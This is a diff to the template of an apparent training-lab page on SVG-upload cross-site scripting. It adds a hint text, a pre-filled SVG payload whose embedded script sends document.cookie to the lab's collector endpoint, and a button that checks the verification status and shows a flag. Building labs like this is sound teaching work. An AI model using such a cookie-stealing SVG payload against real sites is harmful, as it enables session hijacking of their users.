@@ -12,9 +12,12 @@
 
   <div class="lab-card">
     <h1>Upload SVG Avatar</h1>
+    <p>SVG is served back inline as <code>image/svg+xml</code>. Embed script in the SVG to read the proof cookie and send it to the collector.</p>
     <form method="POST" action="/labs/svg-upload-xss">
+      <label>Filename</label>
+      <input name="filename" value="avatar.svg" autocomplete="off">
       <label>SVG Markup</label>
-      <textarea name="svg" rows="6" placeholder="Paste your SVG markup here"></textarea>
+      <textarea name="svg" rows="7" placeholder="Paste your SVG markup here">&lt;svg xmlns="http://www.w3.org/2000/svg"&gt;&lt;script&gt;fetch('/labs/svg-upload-xss/collect?t='+encodeURIComponent(document.cookie))&lt;/script&gt;&lt;/svg&gt;</textarea>
       <button type="submit">Upload</button>
     </form>
   </div>
@@ -23,11 +26,29 @@
     <h2>Gallery</h2>
     <ul class="lab-list">
       <% files.forEach(f => { %>
-        <li><a href="/labs/svg-upload-xss/raw/<%= f._id %>" target="_blank"><%= f.filename %></a></li>
+        <li><a class="lab-link" href="/labs/svg-upload-xss/raw/<%= f._id %>" target="_blank" rel="noopener"><%= f.filename %></a></li>
       <% }) %>
       <% if (files.length === 0) { %><li class="lab-meta">No avatars uploaded yet.</li><% } %>
     </ul>
+    <p class="lab-meta">Open an uploaded SVG in a new tab. The script calls the server-side collector.</p>
+    <button type="button" class="secondary" id="checkSvg">Check verification</button>
+    <pre class="lab-code" id="svgResult" style="margin-top:0.8rem;">Not checked yet.</pre>
   </div>
 
+  <form method="POST" action="/labs/svg-upload-xss/reset"><button type="submit" class="secondary">Reset lab</button></form>
+</div>
+<script>
+  document.getElementById('checkSvg').addEventListener('click', async function () {
+    const out = document.getElementById('svgResult');
+    try {
+      const response = await fetch('/labs/svg-upload-xss/status');
+      const data = await response.json();
+      out.textContent = JSON.stringify(data, null, 2);
+      if (data.flag) out.textContent += '\n\nFLAG: ' + data.flag;
+    } catch (error) {
+      out.textContent = 'Status check failed: ' + error.message;
+    }
+  });
+</script>
 </body>
 </html>
